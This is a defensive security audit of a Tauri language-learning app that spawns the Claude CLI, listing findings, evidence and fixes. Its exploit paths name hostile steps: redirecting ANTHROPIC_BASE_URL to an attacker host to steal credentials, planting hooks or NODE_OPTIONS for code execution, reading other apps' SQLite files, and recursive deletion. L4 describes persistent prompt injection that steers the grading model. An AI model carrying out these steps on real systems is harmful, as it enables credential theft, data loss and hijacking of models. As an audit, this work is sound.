# Security audit: English Exam Coach

Branch `claude/vibrant-keller-e6as6x`, audited 2026-10-30. Read-only audit; nothing in the repo was changed.

Locked versions checked against source in `~/.cargo/registry`: tauri 2.12.5, tauri-plugin-shell 2.5.0, tauri-plugin-fs 2.7.1, tauri-plugin-dialog 2.8.3, tauri-plugin-sql 2.6.0 (sqlx 0.8.6), tauri-plugin-persisted-scope 2.4.2. CLI flag semantics were checked against `claude --help` of the CLI in this sandbox, not the learner's own install.

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 0 |
| Medium | 3 |
| Low | 4 |
| Info | 7 |

**No confirmed XSS or injection path.** The audit found no way to run script in the webview: React escapes text, and react-markdown renders no raw HTML and cleans URLs. No SQL is built from strings with untrusted input. Learner and LLM text reach argv only as the values of fixed flags or as the last positional argument after `--`. The Medium findings are about what a single script-execution bug, or a compromised npm dependency, could then reach. Today that is much more than the app needs: arbitrary code execution as the user (M1), arbitrary SQLite files (M3), and recursive deletes in picked folders (L1). There is also no CSP to stop such a script (M2).

---

## Confirmed / configuration issues

### M1. Medium. Webview controls `cwd` and `env` of the spawned `claude`, which leads to code execution and credential theft if any script runs in the webview

- **Evidence.**
  - `src-tauri/capabilities/default.json:13-976` scopes only the program and argv.
  - tauri-plugin-shell 2.5.0 `src/commands.rs:80-160`: `CommandOptions { cwd, env }` come from JS with no scope check. `command.current_dir(cwd)` and `command.envs(env)` are applied as given, and the app's own environment is inherited, not cleared.
  - `src/adapters/tauri/claudeCli.ts:60-68` passes `{ cwd, env }` from JS.
- **Exploit path (precondition: script running in the webview through a future XSS, a malicious dependency, or a dev-server compromise in `yarn tauri dev`).**
  1. Call `Command.create('claude-local-call', <valid args>, { env: { ANTHROPIC_BASE_URL: 'https://attacker' } })`. The CLI sends the learner's Anthropic credentials (OAuth bearer or API key) to the attacker's host. Not tested end-to-end, but this is how `ANTHROPIC_BASE_URL` works.
  2. Code execution: write `$APPDATA/x/settings.json` containing `hooks` or `apiKeyHelper` with any shell command. `fs:allow-write-text-file` and `fs:allow-mkdir` allow `$APPDATA/**`, and the path has no leading dot, so the fs scope accepts it. Then spawn any allowed shape with `env: { CLAUDE_CONFIG_DIR: '$APPDATA/x' }`. Hooks run even with `--tools ""`.
  3. For npm or Homebrew installs (`/opt/homebrew/bin/claude`, `/usr/local/bin/claude`, both Node scripts), `NODE_OPTIONS=--require $APPDATA/x.js` gives code execution directly.
  4. `cwd` is also free-form, so the CLI's project discovery (CLAUDE.md, `.claude/`) can be pointed at any folder.
- **Fix.** Do not expose `shell:allow-spawn` to the webview. Add one custom Rust command, for example `run_claude({ shape, model, effort, budget, resume, systemPrompt, schema, prompt })`. It should:
  - validate each field (the same regexes as today);
  - build argv itself;
  - set `cwd` to a fixed, app-owned empty folder (for example `$APPDATA/cli-cwd`);
  - build the environment from scratch with `env_clear()` plus `HOME` and `PATH`. Add `USER`/`LOGNAME`/`TMPDIR` only if the CLI needs them on macOS.

  Then drop `shell:allow-spawn` and `shell:allow-kill` from `default.json`, and do the timeout and kill in Rust. If you keep the plugin, there is no way to scope env/cwd in plugin-shell 2.5.0, so this cannot be fixed in configuration alone.

### M2. Medium. No Content Security Policy

- **Evidence.** `src-tauri/tauri.conf.json:25`, `"csp": null`.
- **Impact.** This is the only general barrier between a script-execution bug and the IPC surface in M1, M3 and L1. With `null`, inline script, `eval`, and remote `script-src`/`connect-src` are all allowed, so an injected payload can also load more code or send data out with `fetch`.
- **Fix.** Set something like:

  ```
  default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
  img-src 'self' data:; font-src 'self';
  connect-src ipc: http://ipc.localhost;
  object-src 'none'; base-uri 'none'; frame-src 'none'; form-action 'none'
  ```

  Tauri adds nonces and hashes for its own scripts. Check `yarn tauri dev` separately: Vite HMR needs `ws://localhost:5173` and `http://localhost:5173` in `connect-src`, which can go in `devCsp`. Fonts come from `@fontsource` and are bundled, so `'self'` is enough.

### M3. Medium. `sql:allow-load` + `sql:allow-execute` give the webview read/write access to any SQLite file and let it create files anywhere

- **Evidence.**
  - `default.json:10-11`.
  - tauri-plugin-sql 2.6.0 `src/wrapper.rs:365-371`: `path_mapper` does `app_path.push(<connection string after ':'>)`. An absolute path replaces the base, and the plugin has no path scope.
- **Exploit path (precondition: script in the webview).**
  - `Database.load('sqlite:/Users/<u>/Library/Application Support/Google/Chrome/Default/History')` (or any other app's SQLite file that TCC does not protect), then `select`. The data is read; M2 means nothing stops sending it out.
  - `execute("ATTACH '/any/writable/path' AS x; CREATE TABLE x.t(...)")` creates or modifies files at any path the user can write. The file contents are SQLite-formatted, so this is mostly integrity damage, not a direct code-execution primitive.
- **Fix.** Load the DB from Rust and give the webview only `select`/`execute` on that connection. Options:
  - a small custom command that wraps sqlx, opens only `<dataDir>/enlearn.db`, and runs `PRAGMA` with `SQLITE_LIMIT_ATTACHED=0`;
  - or keep the plugin but drop `sql:allow-load`, preload the DB in Rust, and re-preload after a data-folder move.

  At minimum, document that the sql plugin is unscoped, so M2 is the only guard.

---

## Lower-severity and theoretical issues

### L1. Low. Folders picked in the dialog stay in the fs scope permanently, and recursive `remove` is allowed there

- **Evidence.**
  - `Settings.tsx:57`: `open({ directory: true })`.
  - tauri-plugin-dialog 2.8.3 `commands.rs:175-181` calls `fs_scope.allow_directory(picked, recursive=false)`, which adds the patterns `picked` and `picked/*`.
  - `lib.rs:8` registers persisted-scope, which saves every grant to `$APPDATA/.persisted-scope` and restores it on each start. Old data folders are never revoked.
  - `default.json:1051-1063` grants `fs:allow-remove`. The fs plugin checks only the top path before `remove_dir_all` (`recursive: true`).
- **Exploit path (precondition: script in the webview, and the learner once picked a broad folder such as `~` or `~/Documents`).** `remove('/Users/<u>/Documents', { recursive: true })` matches `~/*` and deletes the whole tree. `writeTextFile` can overwrite any non-dot file directly in that folder. Dot paths are protected because `requireLiteralLeadingDot` defaults to true on Unix.
- **Fix.**
  - Refuse broad targets in the move (see L3).
  - Do the move and deletes in Rust (same custom-command approach as M1/M3) and drop `fs:allow-remove`.
  - Or call `fs_scope().forbid_*` / re-scope on start: grant only `<dataDir>/enlearn.db*` and `<dataDir>/prompts/**` from Rust, and drop persisted-scope.

### L2. Low. Every CLI call runs with the learner's full Claude Code configuration, and project config in `$APPDATA` (and its parent folders) is honored with no trust prompt

- **Evidence.** `boot.ts:36,56` set `cwd = appData` (`~/Library/Application Support/io.github.illidanilli.enlearn`). `claude.ts:23-44` keeps the default setting sources. `--tools ""` and `--strict-mcp-config` disable built-in tools and MCP, but not:
  - CLAUDE.md auto-discovery: `~/.claude/CLAUDE.md`, plus ancestors of cwd up to `~/CLAUDE.md`, and a `CLAUDE.md` placed in `$APPDATA`;
  - hooks from user, project or plugin settings. `UserPromptSubmit` hooks receive every prompt; `SessionStart` hooks run shell commands;
  - output styles, custom slash commands and skills;
  - project `.claude/settings.json` in cwd. `-p` skips the workspace-trust dialog, so a file planted in `$APPDATA/.claude/settings.json` runs hooks on the next call.
- **Impact.**
  - **Privacy.** Contrary to the README section "What is sent to Anthropic", the learner's personal CLAUDE.md content is sent with every lesson, grade and chat call, and the learner's own hooks can log prompts and answers.
  - **Integrity.** CLAUDE.md content can steer grading.
  - **Security.** Planting files in `$APPDATA` is not a privilege boundary (the same user can edit `~/.zshrc`), so this is hardening, not an exploit.
- **Fix.**
  - Pass `--safe-mode`, which the CLI here documents as disabling CLAUDE.md, hooks, skills, plugins, MCP, custom commands and output styles while keeping OAuth, or the env `CLAUDE_CODE_SAFE_MODE=1`. Verify that the learner's CLI version supports it, and add it as a fixed arg to every scope.
  - Add `--disable-slash-commands` (see I1).
  - Use a dedicated empty cwd.
  - Do not use `--bare`: it drops OAuth/keychain auth.
  - Update the README privacy paragraph either way.

### L3. Low. Data-folder move: no refusal of dangerous targets; it takes over an existing `prompts/` folder and later deletes it recursively

- **Evidence.** `src/core/dataFolder.ts:6-14` refuses only `same` and `inside` (target inside source). `src/adapters/tauri/dataFolder.ts:97-105,116-120,147`:
  - It counts as occupied only a target file with the same name as one being copied.
  - A pre-existing unrelated `<target>/prompts/` becomes "the app's" prompts folder. Files named `<kind>.md` in it silently become prompt overrides.
  - On the next move, `listFiles` copies only plain files and dirs. `readDir` reports symlinks as neither file nor dir, so they are skipped. Then `remove(<old>/prompts, { recursive: true })` deletes the whole folder, including skipped symlinks and special files. The `.catch(() => undefined)` hides partial failures.
  - `$HOME`, `/`, `~/Library`, `~/Desktop` and volume roots are accepted as targets. `$HOME` puts `enlearn.db` and `prompts/` loose in the home folder and widens L1.
  - Symlink or case-variant aliases of the source are caught by the `occupied` check (`enlearn.db` exists), which is correct.
- **Precondition.** The learner picks such a folder. No attacker is needed; this is mainly a data-loss risk.
- **Fix.**
  - Always move into an app-named subfolder (`<picked>/English Exam Coach`) that must not exist or must be empty.
  - Refuse `$HOME`, `/`, and anything under `~/Library` or `/System` (other than `$APPDATA`).
  - On cleanup, delete only the exact files in `plan.copies` (then `rmdir` empty dirs) instead of `remove(…, { recursive: true })`.

### L4. Low. A rule-gap proposal replaces the whole rule body in one click, with no diff, no skeleton check and no stale-version guard (persistent prompt injection)

- **Evidence.**
  - `src/core/grading/grade.ts:176-184`: the grade `check` validates refs and tone only, not the proposal's structure.
  - `src/core/grading/apply.ts:88-94` stores `gap.proposal`, a full body produced by the model.
  - `src/ui/today/ItemActions.tsx:17-48` shows only the new body and an Approve button.
  - `src/core/grading/actions.ts:108-125` saves the proposal as the new current version. It compares with the current body only to skip duplicates, not to detect that the rule changed after grading.
  - Compare the rule chat, which runs `checkRuleChatReply` (skeleton) and shows a diff (`RuleChat.tsx:52-70`), and requires a reason.
- **Exploit path.** Text that reaches the grade prompt can steer the model into a `rule_gap` whose proposal drops sections or adds instructions. That text includes the learner's answers and model-generated item prompts and expected answers from the earlier generate call. One plausible-looking click persists it, and the rule body goes into every later `generate_session`, `grade` and `dispute` prompt. A gap proposed against version N and approved after the learner saved N+1 silently reverts N+1. There is no code execution, because tools are off.
- **Fix.**
  - Run the skeleton check (`checkRuleChatReply` logic) on `ruleGaps[].proposal` inside the grade `check`.
  - Show the `lineDiff` tab as in the rule chat.
  - Store `base_version` in `rule_gap` and refuse approval (or rebase) when `rule.current_version` moved.

---

## Info

- **I1. Rule-chat follow-up turns send the learner's raw text as the whole prompt.** See `src/core/rules/chat.ts:39,59`. A message starting with `/` may be read by `claude -p` as a slash command or skill. The learner is the user, so this is self-only. Add `--disable-slash-commands`, or always prefix the turn (for example `Learner's message:\n…`).
- **I2. Prompts travel in argv.** See `claude.ts:29-43`.
  - Other processes of the same user can read them with `ps -o args`.
  - A large `generate_session` or `grade` prompt plus schema can hit macOS `ARG_MAX` (1 MiB) and fail with E2BIG.
  - Fix: pass the prompt on stdin (`-p` reads stdin), done in Rust (M1).
- **I3. Retention.** `llm_call.response` keeps the raw CLI envelope (model output, `session_id`, usage) forever (`src/core/llm/call.ts:178-188`). Failed runs keep stdout and stderr in `error`. Each rule-chat turn with `--resume … --fork-session` writes a new full transcript under `~/.claude/projects/<cwd-slug>/`, so N turns leave N growing copies. These are kept until the CLI's `cleanupPeriodDays` (default 30) removes them. The README states the location; consider a retention note or pruning `llm_call.response` after some time.
- **I4. Prompt overrides, functional bug that fails closed.** With a custom data folder outside `$APPDATA`, the fs scope from the dialog is `picked/*` (not recursive; see L1 evidence). `TauriPromptStore` calls `exists('<picked>/prompts/<kind>.md')` (`promptStore.ts:28-29`), which should then be rejected as a forbidden path, so every LLM call would throw. `copyFile` into `<picked>/prompts/…` during a move with overrides should fail the same way. This is not verified on macOS. It matches the open item in `docs/superpowers/s1-decisions.md:58` and checklist items `docs/macos-checklist.md:83-85`. Do not "fix" it by widening the static scope to `$HOME/**`. Grant `<dataDir>/prompts/**` from Rust at start instead.
- **I5. Budget formatting.** `String(req.budgetUsd)` (`claude.ts:42`) gives `1e-7` or `1e+21` for extreme values, which fail `^\d+(\.\d+)?$`. The spawn is refused (fails closed). Format with `toFixed(4)` or clamp the input.
- **I6. Things the model writes without confirmation (by design, bounded).**
  - `spellingErrors` create `spelling_word` rows (`apply.ts:95-98`).
  - A `defect` verdict removes an item from scoring (`apply.ts:45-47,69-70,102`).
  - `extra` findings and feedback patterns are stored.

  Rule drafts (`RuleDraft.tsx:42-45`), chat proposals (`RuleChat.tsx:34-43`, reason required), rule gaps (L4) and dispute decisions (`actions.ts:200-204`, learner choice) all need a click. No model output writes files or settings.
- **I7. Panics.** `tauri::Builder…expect(...)` in `src-tauri/src/lib.rs:9` runs at startup only. tauri-plugin-sql `path_mapper` panics with `.expect("Couldn't parse the connection string")` on a load string without `:`, which only the webview can reach. A failed `JSON.parse` of a crafted `settings` row (`settings.ts:50`) or `rule_gap.sources` (`actions.ts:121`) throws in JS. All of these are denial of service from local data only.

---

## Checked and found fine

- **Shell argv allowlist.**
  - Validators are wrapped as `^…$` by plugin-shell (`scope.rs:92-97`), and each argument is matched by position.
  - Learner and LLM text appears only as values of `--json-schema` and `--system-prompt` and as the positional after `--`. Commander takes a required option's next argument even when it starts with `-`, and `--` ends option parsing.
  - The `--model` value (`^[a-z0-9.\-]+$`) is a required value. `--effort` is an enum.
  - `--resume` takes an optional value (`-r, --resume [value]`). The UUID regex blocks a leading `-`, and the id comes only from the CLI's own envelope and is kept in memory (`RuleChat.tsx:91,98`). A forged id can only resume sessions under the app's cwd project.
  - `--tools ""` is variadic but followed by `--model`, so parsing stops there.
  - `sidecar: false`. There is no `shell:allow-execute`, `allow-open`, `allow-stdin-write` or `shell:default`.
- **Tools and MCP.** `--tools ""` disables built-in tools and `--strict-mcp-config` without `--mcp-config` loads no MCP servers. A hijacked model cannot read files or run commands; the only remaining channels are the hooks and CLAUDE.md in L2.
- **Webview.**
  - No `dangerouslySetInnerHTML`, `innerHTML`, `eval` or `iframe`.
  - react-markdown 10 has no `rehype-raw`, uses the default `urlTransform` (drops `javascript:`, `data:`, `vbscript:`), and React 19 also blocks `javascript:` URLs.
  - `img` renders as `null` (`RuleBody.tsx:22`).
  - Source URLs are rendered as text, not links (`RulePanel.tsx:24`).
  - No `remote` capability, no `withGlobalTauri`, and no `devtools` Cargo feature (release build has no devtools). `core:default` contains no webview-creation permission.
- **SQL.** All queries use parameters. Dynamic parts are `?` placeholder lists (`sessions.ts:24`, `setup.ts:123-132`) and a constant fragment (`answers.ts:127`). Migrations are bundled constants.
- **Prompt store.** `kind` comes from the fixed `LlmKind` union, so there is no traversal. An override can change only the system prompt and schema text, which travel as fixed-flag values. Ajv 8 compiles schemas without remote `$ref` loading.
- **`location.json`.** Read only from `$APPDATA`, parsed with `JSON.parse`, and only a string is accepted. A bad file surfaces as a notice.
- **Persisted scope state.** `$APPDATA/.persisted-scope` is a dot file, so the webview cannot write it through the `$APPDATA/**` fs scope.
- **Rust.** No custom commands and no `unsafe`; only plugin registration (`src-tauri/src/lib.rs`).
- **Dependencies.** `yarn npm audit --all --recursive` (registry.npmjs.org) reported no advisories. `cargo audit` is not installed, so it was not run.
